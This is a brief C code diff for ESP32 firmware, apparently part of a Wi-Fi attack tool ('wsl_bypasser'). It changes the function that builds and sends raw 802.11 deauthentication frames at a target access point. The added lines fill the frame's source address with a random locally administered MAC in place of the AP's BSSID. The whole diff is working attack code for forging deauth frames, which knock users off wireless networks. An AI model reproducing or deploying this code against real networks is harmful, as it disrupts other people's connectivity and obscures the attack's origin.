@@ -16,6 +16,7 @@
 #include "esp_err.h"
 #include "esp_wifi.h"
 #include "esp_wifi_types.h"
+#include "esp_random.h"
 
 static const char *TAG = "wsl_bypasser";
 /**
@@ -52,7 +53,10 @@ void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record){
     ESP_LOGD(TAG, "Sending deauth frame...");
     uint8_t deauth_frame[sizeof(deauth_frame_default)];
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
-    memcpy(&deauth_frame[10], ap_record->bssid, 6);
+    uint8_t src_mac[6];
+    esp_fill_random(src_mac, sizeof(src_mac));
+    src_mac[0] = (src_mac[0] & 0xFE) | 0x02;
+    memcpy(&deauth_frame[10], src_mac, 6);
     memcpy(&deauth_frame[16], ap_record->bssid, 6);
     
     wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
